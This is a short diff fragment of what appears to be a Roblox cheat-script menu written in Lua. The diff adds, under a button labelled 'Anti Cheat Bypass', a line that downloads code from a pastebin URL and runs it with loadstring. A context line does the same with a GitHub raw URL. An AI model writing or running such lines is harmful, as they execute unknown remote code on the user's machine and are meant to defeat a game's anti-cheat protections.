@@ -59,7 +59,7 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Nindenz/Nindenz/main/
 end)
 
 Bypass:NewButton("Anti Cheat Bypass", "IDK", function()
-
+loadstring(game:HttpGet('https://pastebin.com/raw/DsTS0RDK'))()
 end)
 
 ----------------------------------------Game-
